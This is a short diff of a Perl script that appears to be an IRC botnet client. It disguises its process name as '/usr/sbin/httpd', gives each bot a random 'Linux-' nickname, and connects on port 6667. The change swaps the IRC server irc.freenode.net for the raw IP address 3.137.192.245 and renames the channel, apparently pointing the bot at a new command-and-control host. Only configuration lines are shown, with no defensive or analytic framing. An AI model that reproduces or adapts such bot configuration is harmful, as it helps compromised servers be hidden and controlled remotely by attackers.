@@ -2,9 +2,9 @@
 
 use IO::Socket;
 my $processo = '/usr/sbin/httpd';
-my $server  = "irc.freenode.net"; 
+my $server  = "3.137.192.245"; 
 my $code = int(rand(100000));
-my $channel = "#hyakimaro";
+my $channel = "#network";
 my $port    = "6667";
 my $nick    = "Linux-$code"; #$code vai gerar um número aleatório#
 
